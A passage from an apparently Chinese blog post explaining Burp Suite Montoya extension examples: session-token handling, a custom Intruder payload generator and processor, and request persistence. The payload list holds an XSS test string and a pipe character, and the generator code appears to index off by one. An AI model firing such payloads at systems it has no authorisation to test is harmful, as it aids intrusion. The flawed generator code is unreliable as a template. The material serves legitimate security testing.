class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个插件主要用于以下几种场景中：</p><ol><li><strong>自动化会话管理</strong>：<ul><li>在进行自动化渗透测试或功能测试时，特别是当会话令牌需要频繁更新以保持会话活跃的场合，此插件可以自动地从先前的交互（如登录后的响应）中提取新的会话令牌，并用其更新随后的请求。这确保了测试过程中的会话有效性和连续性。</li></ul></li><li><strong>多步骤过程中的令牌管理</strong>：<ul><li>在需要执行多个依赖于特定会话状态的步骤的测试中，如购物车添加商品、结账等步骤，此插件能够确保每一步使用正确的会话令牌，从而避免测试因会话过期或令牌失效而失败。</li></ul></li><li><strong>应对防御机制</strong>：<ul><li>在目标应用实施了严格的会话管理策略（例如会话固定、会话超时、每次请求后更新令牌等）的情况下，此插件通过动态更新会话令牌来帮助绕过这些机制，允许测试者模拟或维持一个持久的会话状态。</li></ul></li><li><strong>宏和自定义脚本中使用</strong>：<ul><li>当使用 Burp Suite 的宏功能进行复杂的预配置任务时，如自动登录并执行一系列操作，此插件可以被配置为宏的一部分，用于在执行宏时自动处理会话令牌的更新。</li></ul></li><li><strong>维持活跃会话</strong>：<ul><li>在测试需要长时间运行的脚本或过程时，例如长时间的漏洞扫描或大量数据的传输测试，此插件能够帮助维护会话的活跃状态，避免因会话超时而导致的中断。</li></ul></li></ol><h2 id="Custom-Intruder-Payloads-Example-Extension"><a href="#Custom-Intruder-Payloads-Example-Extension" class="headerlink" title="Custom Intruder Payloads Example Extension"></a>Custom Intruder Payloads Example Extension</h2><p>This example shows how you can use an extension to:</p><ul><li>Generate custom Intruder payloads</li><li>Apply custom processing to Intruder payloads (including built-in ones)</li></ul><p>When an extension registers itself as an Intruder payload provider, this will be available within the Intruder UI for the user to select as the payload source for an attack. When an extension registers itself as a payload processor, the user can create a payload processing rule and select the extension’s processor as the rule’s action.</p><p>The extension uses the following techniques:</p><ul><li>Registers a new <code>PayloadGeneratorProvider</code>, which returns a new <code>PayloadGenerator</code></li><li>Registers a new <code>PayloadProcessor</code></li><li>The <code>PayloadGenerator</code> does the following:<ul><li>Contains a list of payloads to be used</li><li>Iterates through the payload list, until there are no longer any payloads available</li></ul></li><li>The <code>PayloadProcessor</code> does the following:<ul><li>Decodes the base value of the payload</li><li>Parses the location of the <code>input</code> string in the decoded data</li><li>Rebuilds the serialized data with the new payload</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> aiassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.ByteArray;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadData;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadProcessingResult;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadProcessor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.Base64Utils;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.URLUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.intruder.PayloadProcessingResult.usePayload;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 PayloadProcessor 接口的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyPayloadProcessor</span> <span class="keyword">implements</span> <span class="title class_">PayloadProcessor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INPUT_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;input=&quot;</span>; <span class="comment">// 定义输入前缀，用于解析和重建数据</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyPayloadProcessor</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api; <span class="comment">// 获取 Montoya API 实例</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">displayName</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Serialized input wrapper&quot;</span>; <span class="comment">// 显示名，用于识别处理器</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> PayloadProcessingResult <span class="title function_">processPayload</span><span class="params">(PayloadData payloadData)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Base64Utils</span> <span class="variable">base64Utils</span> <span class="operator">=</span> api.utilities().base64Utils();</span><br><span class="line">        <span class="type">URLUtils</span> <span class="variable">urlUtils</span> <span class="operator">=</span> api.utilities().urlUtils();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对基础值进行解码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">dataParameter</span> <span class="operator">=</span> base64Utils.decode(urlUtils.decode(payloadData.insertionPoint().baseValue())).toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析输入字符串在解码数据中的位置</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> findPrefix(dataParameter);</span><br><span class="line">        <span class="keyword">if</span> (prefix == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> usePayload(payloadData.currentPayload()); <span class="comment">// 如果没有找到前缀，使用当前负载</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> findSuffix(dataParameter);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用新负载重建序列化数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">rebuiltDataParameter</span> <span class="operator">=</span> prefix + payloadData.currentPayload() + suffix;</span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">reserializedDataParameter</span> <span class="operator">=</span> urlUtils.encode(base64Utils.encode(rebuiltDataParameter));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> usePayload(reserializedDataParameter); <span class="comment">// 返回处理后的负载</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">findPrefix</span><span class="params">(String dataParameter)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> dataParameter.indexOf(INPUT_PREFIX);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果没有找到前缀，返回 null</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        start += INPUT_PREFIX.length();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dataParameter.substring(<span class="number">0</span>, start);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">findSuffix</span><span class="params">(String dataParameter)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> dataParameter.indexOf(INPUT_PREFIX);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> dataParameter.indexOf(<span class="string">&quot;&amp;&quot;</span>, start);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (end == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            end = dataParameter.length();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dataParameter.substring(end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.AttackConfiguration;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadGenerator;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadGeneratorProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyPayloadGeneratorProvider</span> <span class="keyword">implements</span> <span class="title class_">PayloadGeneratorProvider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">displayName</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;My custom payloads&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> PayloadGenerator <span class="title function_">providePayloadGenerator</span><span class="params">(AttackConfiguration attackConfiguration)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyPayloadGenerator</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.GeneratedPayload;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.IntruderInsertionPoint;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadGenerator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyPayloadGenerator</span> <span class="keyword">implements</span> <span class="title class_">PayloadGenerator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; PAYLOADS = List.of(<span class="string">&quot;|&quot;</span>, <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> payloadIndex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> GeneratedPayload <span class="title function_">generatePayloadFor</span><span class="params">(IntruderInsertionPoint insertionPoint)</span></span><br><span class="line">    &#123;</span><br><span class="line">        payloadIndex++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (payloadIndex &gt; PAYLOADS.size())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> GeneratedPayload.end();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> PAYLOADS.get(payloadIndex);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> GeneratedPayload.payload(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntruderPayloads</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Intruder payloads&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.intruder().registerPayloadGeneratorProvider(<span class="keyword">new</span> <span class="title class_">MyPayloadGeneratorProvider</span>());</span><br><span class="line">        api.intruder().registerPayloadProcessor(<span class="keyword">new</span> <span class="title class_">MyPayloadProcessor</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/24/tools/burpsuite-plugins2/image.png" alt="在这里可以选择生成payload的方式"></p><h2 id="Persistence-Example-Extension"><a href="#Persistence-Example-Extension" class="headerlink" title="Persistence Example Extension"></a>Persistence Example Extension</h2><p>The extension works as follows:</p><ul><li>It saves and loads a simple incrementing integer value with the project file.<ul><li>Sends to the event log how many times Burp or the extension were restarted.</li></ul></li><li>It saves and loads extension built http requests<ul><li>Sends the  requests to repeater with an incrementing tab counter when Burp is restarted or the extension is reloaded.</li></ul></li><li>It saves the last 5 requests&#x2F;responses issued by Burp<ul><li>Prints the last 5 request&#x2F;responses to the output log when burp is restarted or the extension is reloaded. </li><li>Uses Persisted Lists to automatically save&#x2F;load data stored in the list.</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.persistence.PersistedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.requests.HttpRequest.httpRequest;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.requests.HttpRequest.httpRequestFromUrl;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> example.persistence.PersistenceExample.STARTUP_COUNT_KEY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SavingLoadingRequests</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SIMPLE_REQUEST_KEY</span> <span class="operator">=</span> <span class="string">&quot;simpleRequest&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REQUEST_WITH_HEADERS_KEY</span> <span class="operator">=</span> <span class="string">&quot;requestWithHeaders&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REQUEST_FROM_URL_KEY</span> <span class="operator">=</span> <span class="string">&quot;requestFromUrl&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PersistedObject myExtensionData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SavingLoadingRequests</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">        <span class="built_in">this</span>.myExtensionData = api.persistence().extensionData();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 运行示例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runExample</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 检查是否已经保存了示例请求</span></span><br><span class="line">        <span class="keyword">if</span> (!checkForRequests()) &#123;</span><br><span class="line">            api.logging().raiseInfoEvent(<span class="string">&quot;No Requests saved, creating requests&quot;</span>);</span><br><span class="line">            createAndSaveExampleRequests();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sendExampleRequestsToRepeaterWithStartupCount();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否存在保存的请求</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkForRequests</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 获取保存的 HTTP 请求的键集合，并检查所需的键是否都存在</span></span><br><span class="line">        <span class="keyword">return</span> myExtensionData.httpRequestKeys().contains(SIMPLE_REQUEST_KEY) &amp;&amp;</span><br><span class="line">                myExtensionData.httpRequestKeys().contains(REQUEST_WITH_HEADERS_KEY) &amp;&amp;</span><br><span class="line">                myExtensionData.httpRequestKeys().contains(REQUEST_FROM_URL_KEY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建并保存示例请求</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">createAndSaveExampleRequests</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">simpleRequest</span> <span class="operator">=</span> httpRequest(<span class="string">&quot;GET / HTTP1.0\r\n\r\n&quot;</span>);</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">requestWithHeaders</span> <span class="operator">=</span> httpRequest(<span class="string">&quot;GET / HTTP1.1\r\nHost: localhost\r\nMyHeader: Example\r\n\r\n&quot;</span>);</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">requestFromUrl</span> <span class="operator">=</span> httpRequestFromUrl(<span class="string">&quot;http://localhost&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将每个请求保存到其对应的键下</span></span><br><span class="line">        myExtensionData.setHttpRequest(SIMPLE_REQUEST_KEY, simpleRequest);</span><br><span class="line">        myExtensionData.setHttpRequest(REQUEST_WITH_HEADERS_KEY, requestWithHeaders);</span><br><span class="line">        myExtensionData.setHttpRequest(REQUEST_FROM_URL_KEY, requestFromUrl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将请求发送到 Repeater，并在标签名称中加入启动计数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendExampleRequestsToRepeaterWithStartupCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">simpleRequest</span> <span class="operator">=</span> myExtensionData.getHttpRequest(SIMPLE_REQUEST_KEY);</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">requestWithHeaders</span> <span class="operator">=</span> myExtensionData.getHttpRequest(REQUEST_WITH_HEADERS_KEY);</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">requestFromUrl</span> <span class="operator">=</span> myExtensionData.getHttpRequest(REQUEST_FROM_URL_KEY);</span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">startupCount</span> <span class="operator">=</span> myExtensionData.getInteger(STARTUP_COUNT_KEY);</span><br><span class="line"></span><br><span class="line">        api.repeater().sendToRepeater(simpleRequest, <span class="string">&quot;Simple Request &quot;</span> + startupCount);</span><br><span class="line">        api.repeater().sendToRepeater(requestWithHeaders, <span class="string">&quot;Request With Headers &quot;</span> + startupCount);</span><br><span class="line">        api.repeater().sendToRepeater(requestFromUrl, <span class="string">&quot;Request From Url &quot;</span> + startupCount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.*;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.persistence.PersistedList;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.persistence.PersistedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.handler.RequestToBeSentAction.continueWith;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.handler.ResponseReceivedAction.continueWith;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestResponseLogging</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REQUEST_RESPONSE_LIST_KEY</span> <span class="operator">=</span> <span class="string">&quot;last5&quot;</span>;  <span class="comment">// 用于保存数据的键</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PersistedObject myExtensionData;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RequestResponseLogging</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">        <span class="built_in">this</span>.myExtensionData = api.persistence().extensionData();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runExample</span><span class="params">()</span> &#123;</span><br><span class="line">        ensurePersistedListIsPresent();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从项目文件中加载请求/响应列表</span></span><br><span class="line">        PersistedList&lt;HttpRequestResponse&gt; myPersistedList = myExtensionData.getHttpRequestResponseList(REQUEST_RESPONSE_LIST_KEY);</span><br><span class="line">        printToOutput(myPersistedList);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注册 HTTP 处理器来处理请求和响应</span></span><br><span class="line">        api.http().registerHttpHandler(<span class="keyword">new</span> <span class="title class_">HttpHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> RequestToBeSentAction <span class="title function_">handleHttpRequestToBeSent</span><span class="params">(HttpRequestToBeSent requestToBeSent)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> continueWith(requestToBeSent);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">synchronized</span> ResponseReceivedAction <span class="title function_">handleHttpResponseReceived</span><span class="params">(HttpResponseReceived responseReceived)</span> &#123;</span><br><span class="line">                <span class="comment">// 保持列表中最多 5 条记录</span></span><br><span class="line">                <span class="keyword">if</span> (myPersistedList.size() &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">                    myPersistedList.remove(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 为了日志记录，我们不需要保留正文内容</span></span><br><span class="line">                myPersistedList.add(httpRequestResponse(responseReceived.initiatingRequest().withBody(<span class="string">&quot;&quot;</span>), responseReceived.withBody(<span class="string">&quot;&quot;</span>)));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> continueWith(responseReceived);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title 